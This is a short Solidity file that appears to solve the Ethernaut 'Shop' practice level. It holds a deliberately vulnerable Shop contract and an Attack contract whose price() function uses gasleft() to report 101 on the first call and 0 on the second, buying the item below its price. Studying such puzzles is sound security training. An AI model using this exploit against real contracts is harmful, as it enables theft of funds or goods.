// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Attack is Buyer {
    uint threshold;

    function attack(Shop s, uint _threshold) external {
        threshold = _threshold;
        s.buy();
    }

    function price() override external view returns (uint) {
        if (threshold > gasleft()) {
            return 0;
        }
        return 101;
    }
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
